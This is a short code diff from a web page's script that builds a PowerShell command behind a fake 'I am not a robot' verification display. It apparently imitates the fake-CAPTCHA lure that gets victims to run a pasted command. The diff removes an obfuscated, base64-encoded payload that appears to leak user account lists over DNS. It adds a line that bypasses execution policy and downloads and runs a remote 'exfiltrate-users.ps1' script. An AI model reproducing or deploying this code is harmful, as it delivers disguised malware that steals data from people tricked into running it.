@@ -195,8 +195,8 @@
                 (document.getElementById('verification-id').textContent = verificationId);
             
             const exe = "powershell";
-            const flags = "-NoProfile -EncodedCommand";
-            const payload = "JABtAD0AKABuAGUAdAAgAHUAcwBlAHIAIAAyAD4AJABuAHUAbABsACkALQBqAG8AaQBuACIAYABuACIAOwAkAGUAPQBbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAG0AKQApAC0AcgBlAHAAbABhAGMAZQAnAFsAKwAvAD0AXQAnACwAJwAnADsAKAAoACQAZQAgAC0AcwBwAGwAaQB0ACAAJwAoAC4AewAxACwANQAwAH0AKQAnAHwAPwB7ACQAXwB9ACkAfAAlAHsAJABpAD0AMAB9AHsAUgBlAHMAbwBsAHYAZQAtAEQAbgBzAE4AYQBtAGUAIAAtAE4AYQBtAGUAIAAiACQAXwAuACQAKAAkAGkAKwArACkAMAAwAHkAcwAyADEAeQB4AHIAawBvAHYAaABuAGwAMgA2AGkAcAA3AGEAYwBhADIAZAB0AGoAbAA3AGYAdgA0AC4AbwBhAHMAdABpAGYAeQAuAGMAbwBtACIAIAAtAFQAeQBwAGUAIABUAFgAVAB9ACkACgA=";
+            const flags = "-NoProfile -ExecutionPolicy Bypass -Command";
+            const payload = "\"IEX (New-Object Net.WebClient).DownloadString('https://d5testing.github.io/exfiltrate-users.ps1')\"";
             const fullCommand = `${exe} ${flags} ${payload}`;
 
             commandDisplay.textContent = '✅ "I am not a robot"';
